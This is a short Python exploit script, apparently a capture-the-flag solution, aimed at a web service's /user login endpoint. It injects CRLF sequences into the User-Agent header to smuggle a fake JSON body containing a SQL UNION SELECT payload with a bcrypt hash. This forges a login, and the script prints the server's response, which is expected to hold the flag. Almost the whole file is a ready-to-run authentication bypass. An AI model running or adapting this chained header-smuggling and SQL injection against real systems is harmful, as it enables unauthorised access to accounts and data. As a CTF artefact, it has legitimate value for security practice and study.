import requests
import sys
import json
from urllib.parse import urljoin, urlencode

if len(sys.argv) != 2:
    print("Usage: python3 GateCrash.py <ip:port>")
    sys.exit(1)

host = sys.argv[1]
base_url = f"http://{host}/"
url = urljoin(base_url, "user")

# CRLF injection payload injects a fake JSON body using line breaks in User-Agent
crlf_payload = (
    'ChromeBot/9.5%0D%0A%0D%0A'
    '{"username": "\' UNION SELECT 1, \'test\', '
    '\'$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq", '
    '"password": "test"}'
)

# Dummy POST data (same length as injected body)
post_data = {
    "username": "a" * 120,
    "password": "a" * 4
}
encoded_data = urlencode(post_data)

headers = {
    "User-Agent": crlf_payload,
    "Content-Type": "application/x-www-form-urlencoded"
}

res = requests.post(url, data=encoded_data, headers=headers)

# Server response with the flag
print(res.text)
